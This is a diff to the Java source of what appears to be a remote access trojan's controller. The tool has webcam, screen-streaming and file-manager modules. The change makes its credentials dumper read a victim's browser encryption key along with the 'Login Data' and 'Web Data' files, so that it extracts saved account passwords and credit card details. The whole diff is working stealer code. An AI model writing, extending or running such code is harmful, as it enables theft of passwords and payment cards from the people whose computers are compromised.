@@ -3,7 +3,9 @@ package Connections;
 import GUI.Main;
 import GUI.TableUtils.Credentials.CredentialsManagerGUI;
 import GUI.TableUtils.Credentials.Dumper.CredentialsDumper;
+import GUI.TableUtils.Credentials.Packets.AccountCredentials;
 import GUI.TableUtils.Credentials.Packets.CombinedCredentials;
+import GUI.TableUtils.Credentials.Packets.CreditCardCredentials;
 import GUI.TableUtils.FileManager.FileManagerGUI;
 import GUI.TableUtils.ScreenStreaming.ScreenStreamerGUI;
 import GUI.TableUtils.WebcamManager.WebcamGUI;
@@ -17,6 +19,8 @@ import javax.swing.*;
 import javax.swing.table.DefaultTableModel;
 import javax.swing.table.TableModel;
 import java.awt.*;
+import java.io.*;
+import java.nio.file.Files;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
@@ -214,7 +218,13 @@ public class Updater {
     }
 
     public void updateCredentialsDumper(String path) {
-        CredentialsDumper credentialsDumper = new CredentialsDumper(path);
+        byte[] secretKeyBytes;
+        try {
+            secretKeyBytes = Files.readAllBytes(new File(path + "\\Encryption Key").toPath());
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+        CredentialsDumper credentialsDumper = new CredentialsDumper(secretKeyBytes, path + "\\Login Data", path + "\\Web Data");
         CombinedCredentials combinedCredentials = credentialsDumper.getCredentials();
         ArrayList<AccountCredentials> accountCredentials = (ArrayList<AccountCredentials>) combinedCredentials.accountCredentials();
         ArrayList<CreditCardCredentials> creditCardCredentials = (ArrayList<CreditCardCredentials>) combinedCredentials.creditCardCredentials();
